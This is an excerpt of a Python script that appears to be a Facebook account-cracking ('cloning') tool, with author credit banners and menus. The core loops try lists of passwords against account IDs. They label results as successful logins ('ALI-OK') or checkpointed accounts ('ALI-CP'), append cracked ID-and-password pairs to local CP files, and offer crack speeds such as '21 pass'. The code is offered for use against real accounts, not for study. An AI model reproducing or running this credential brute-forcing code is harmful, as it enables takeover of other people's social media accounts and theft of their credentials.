...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sDesign By %sMICRON %s& %sSHAHZAIN\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/BHAIDADAHO\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sFacebook.com/amir.mugal1\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %shttps://github.com/shadowmicron"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
def menu_log():
    ...
    if pmu in ['']:
        ...
        if pf in ['']:
            ...
            os.system('xdg-open https://facebook.com/abukalinkcopykarlia')
            ...
            os.system('xdg-open https://facebook.com/abulalinkcopykarlia')
            tutor_target()
            input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
            menu_log()
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sALI-CP%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                    ...
                    print("\r%s[%sALI-CP%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sALI-OK%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sALI-OK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sALI-CP%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                    ...
                    h_cp = "\r%s[%sALI-CP%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
...
def var_author():
    ...
    mlaku('%s║     • %sALI'%(O,P))
    mlaku('%s║     • %sALI RAZA'%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sMR CUTE'%(O,P))
    mlaku('%s║     • %s'%(O,P))
    mlaku('%s║     • %sITS ME'%(O,P))
    mlaku('%s║     • %sENJOY CLONING '%(O,P))
    mlaku('%s║     • %sMANY MORE TO COME'%(O,P))
    mlaku('%s║     • %sI LOVE U'%(O,P))
    mlaku('%s║     • %sENJOY '%(O,P))
    mlaku('%s║     • %sPAKISTAN ZINDABAD'%(O,P))
    mlaku('%s║     • %sMASTI KAR RIA'%(O,P))
    mlaku('%s║     • %sTU CHUTI KAR'%(O,P))
    mlaku('%s║     • %sTITU PARTY NA LA'%(O,P))
    mlaku('%s║     • %sWHAT DO YOU THINK?'%(O,P))
    mlaku('%s║'%(O))
def var_ugen():
...
def start_methodezz():
    ...
    print('%s╠══[%s3%s] %sVery Slow Crack %s[%s21 pass%s]'%(O,P,O,P,O,P,O))
